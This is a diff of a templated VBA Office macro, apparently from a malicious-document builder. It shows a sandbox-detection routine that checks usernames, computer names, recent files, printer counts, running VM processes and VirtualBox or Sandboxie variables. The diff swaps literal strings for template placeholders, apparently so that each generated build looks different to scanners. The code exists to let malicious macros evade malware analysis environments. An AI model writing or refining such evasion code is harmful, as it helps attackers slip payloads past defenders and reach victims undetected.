@@ -102,13 +102,13 @@ Private Function {{ v.fn_sandbox }}() As Boolean
     If Application.Documents.Count < 1 Then {{ v.fn_sandbox }} = True: Exit Function
     If Application.RecentFiles.Count < 3 Then {{ v.fn_sandbox }} = True: Exit Function
     Dim usr As String: usr = LCase(Environ("USERNAME"))
-    Dim badU: badU = Array("sandbox","malware","virus","sample","cuckoo","user","admin")
+    Dim badU: badU = Split({{ v.vba_bad_users }}, Chr(124))
     Dim i As Integer
     For i = 0 To UBound(badU)
         If usr = CStr(badU(i)) Then {{ v.fn_sandbox }} = True: Exit Function
     Next
     Dim cname As String: cname = LCase(Environ("COMPUTERNAME"))
-    Dim badC: badC = Array("sandbox","malware","virus","analysis","cuckoo")
+    Dim badC: badC = Split({{ v.vba_bad_computers }}, Chr(124))
     For i = 0 To UBound(badC)
         If InStr(cname, CStr(badC(i))) > 0 Then {{ v.fn_sandbox }} = True: Exit Function
     Next
@@ -161,7 +161,7 @@ Private Function {{ v.fn_sandbox }}() As Boolean
     On Error Resume Next
     Set wmiSvc3 = GetObject({{ v.vba_winmgmts }})
     If Err.Number = 0 Then
-        Dim prtQ As Object: Set prtQ = wmiSvc3.ExecQuery("SELECT Name FROM Win32_Printer")
+        Dim prtQ As Object: Set prtQ = wmiSvc3.ExecQuery({{ v.vba_wmi_printer_q }})
         Dim prtCnt As Long: prtCnt = 0
         Dim oPrt As Object
         For Each oPrt In prtQ: prtCnt = prtCnt + 1: Next
@@ -173,7 +173,7 @@ Private Function {{ v.fn_sandbox }}() As Boolean
     On Error Resume Next
     Set wmiProc = GetObject({{ v.vba_winmgmts }})
     If Err.Number = 0 Then
-        Dim pQ As Object: Set pQ = wmiProc.ExecQuery("SELECT Name FROM Win32_Process")
+        Dim pQ As Object: Set pQ = wmiProc.ExecQuery({{ v.vba_wmi_proc_q }})
         Dim badProc() As String: badProc = Split({{ v.vba_vm_procs }}, "|")
         Dim oP As Object, pn As String, j As Integer
         For Each oP In pQ
@@ -185,8 +185,8 @@ Private Function {{ v.fn_sandbox }}() As Boolean
     End If
     On Error GoTo 0
     Set wmiProc = Nothing
-    If Environ("VBOX_VERSION") <> "" Then {{ v.fn_sandbox }} = True: Exit Function
-    If Environ("SANDBOXIE_HOME") <> "" Then {{ v.fn_sandbox }} = True: Exit Function
+    If Environ({{ v.vba_env_vbox }}) <> "" Then {{ v.fn_sandbox }} = True: Exit Function
+    If Environ({{ v.vba_env_sandboxie }}) <> "" Then {{ v.fn_sandbox }} = True: Exit Function
 End Function
 
 Private Sub {{ v.fn_exec }}()
